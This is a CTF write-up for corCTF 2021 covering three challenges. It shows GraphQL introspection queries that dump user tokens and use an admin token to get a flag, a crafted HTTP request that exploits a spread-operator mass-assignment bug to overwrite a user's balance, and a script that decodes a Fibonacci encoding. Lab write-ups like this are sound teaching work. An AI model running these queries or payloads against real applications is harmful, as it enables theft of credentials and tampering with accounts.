---
title: "corCTF 2021"
date: 2021-08-22
draft: false
tags: ["ctf"]
---

A jeopardy CTF ([CTFtime event](https://ctftime.org/event/1364/)) by [Crusaders of Rust](https://ctf.cor.team/). I didn't have much time so focused on the lower-level web chals, but it felt like a solid intermediate to hard CTF with great difficulty and category distribution. Didn't have any OSINT or forensics though :(

## web/devme
> an ex-google, ex-facebook tech lead recommended me this book!
> https://devme.be.ax

Just like [TechLead](https://www.youtube.com/channel/UC4xKdmAXFh4ACyhpiQ_3qBw), the linked site was flashy but mostly empty. Only this email input field stood out.

![email input field](devme-1.png)

Using a dummy email, it sent a GraphQL request on submission:

```http
POST /graphql HTTP/1.1
Content-Type: application/json

{
    "query": "mutation createUser($email: String!) {\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n",
    "variables": {
        "email": "test@test.com"
    }
}
```

So the query element can be replaced with a stringified GraphQL query, and the variables element can be discarded. John Hammond made [a great video](https://www.youtube.com/watch?v=0wPKzinwM7A) on GraphQL introspection, which I reopened to refresh my memory. Then I opened up Burp and got to work. 

```graphql
{
    __schema {
        types {
            name
        }
    }
}
```
```json
{
    "data": {
        "__schema": {
            "types": [
                {
                    "name": "Query"
                },
                ... lots of default types
                {
                    "name": "User"
                }
            ]
        }
    }
}
```

That `Users` type looks interesting, I wonder what properties it has? I turned to [the GraphQL docs](https://graphql.org/learn/introspection/) for help.

```graphql
{
    __type(name: "User") {
        fields {
            name
        }
    }
}
```
```json
{
    "data": {
        "__type": {
            "fields": [
                {
                    "name": "token"
                },
                {
                    "name": "username"
                }
            ]
        }
    }
}
```

Ok. Now let's see what queries are supported.

```graphql
{
    __type(name: "Query") {
        fields {
            name
        }
    }
}
```
```json
{
    "data": {
        "__type": {
            "fields": [
                {
                    "name": "users"
                },
                {
                    "name": "flag"
                }
            ]
        }
    }
}
```

Surely it's not that easy...

```graphql
{
    flag
}
```
```json
{
    "errors": [
        {
            "message": "Field \"flag\" argument \"token\" of type \"String!\" is required, but it was not provided.",
            "locations": [
                {
                    "line": 1,
                    "column": 2
                }
            ]
        }
    ]
}
```

Ok, we need a token. Let's try the `users` query from earlier.

```graphql
{
    users {
        username
        token
    }
}
```
```json
{
    "data": {
        "users": [
            {
                "username": "admin",
                "token": "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b"
            },{
                "username": "b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c",
                "token": "5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6"
            }
            ... more users
        ]
    }
}
```

Using the admin's token got the flag.

```graphql
{
    flag(token: "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b")
}
```
```json
{
    "data": {
        "flag": ""
    }
}
```

## web/buyme
> I made a new site to buy flags! But no hoarding, okay :<

> https://buyme.be.ax

> [buyme.tar.xz](buyme.tar.xz)

The source was provided this time, so I started with a code audit. It was a typical 'shop' CTF webapp for 'flags' built on Express, using in-memory JavaScript `Map`s for state.
There were functions for registration, login, purchasing and viewing flags, but not changing a user's balance. So I focused on the `buy` endpoint.
```js
router.post("/buy", requiresLogin, async (req, res) => {
    if(!req.body.flag) {
        return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
    }

    try {
        db.buyFlag({ user: req.user, ...req.body });
    }
    catch(err) {
        return res.redirect("/flags?error=" + encodeURIComponent(err.message));
    }

    res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
});
```

A subtle bug jumped out at me, as I'd run into it several days beforehand on a personal project.
The call to `db.buyFlag` uses the [spread operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#spread_in_object_literals) `...req.body`, but it's used after setting the user property. This allows the user property to be overriden by the contents of `req.body`. `req.body` is just the request body, so we can set the user arbitrarily.

The `buy` endpoint requires login, so I registered a user and extracted the `user` cookie.
I also visited the shop page, to get the name and price of the target flag (`corCTF`).

```http
POST /api/buy HTTP/1.1
Content-Type: application/json
Cookie: user=s%3Apl4nty.WTNCqX1%2F%2F4sICQw5z2kLMj5e%2FpH4UNAvqYBU5wAGs%2Bo

{
	"flag":  "corCTF",
    "user": {
        "user":"pl4nty",
        "money":1e+300,
        "flags":[]
    }
}
```

> Found. Redirecting to `/?message=Flag%20bought%20successfully`

The site's 'view flags' page had the flag.

## crypto/fibinary
> Warmup your crypto skills with the superior number system!
> [enc.py](fibinary-enc.py) [flag.enc](fibinary-flag.enc)

An encoded flag and its Python encoding script were provided.

```python
fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b

flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
with open('flag.enc', 'w') as f:
	f.write(enc.strip())
```

Flag characters were encoded as space-separated 11-bit strings.
A `1` bit referenced a corresponding big-endian Fibonacci number, adding together to an ASCII charcode. The following script reads each string, adds the selected Fibonacci numbers, and converts to a character. Together, these characters gave the flag.

```python
fib = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89]

def f2c(f):
    n = 0
    for i in range(len(f)):
        if f[i] == '1':
            n += fib[len(fib)-i-1]
    print(n)
    return chr(n)

enc = open('flag.enc', 'r').read()
dec = ''
for f in enc.split():
	dec += f2c(f)

print(dec)
```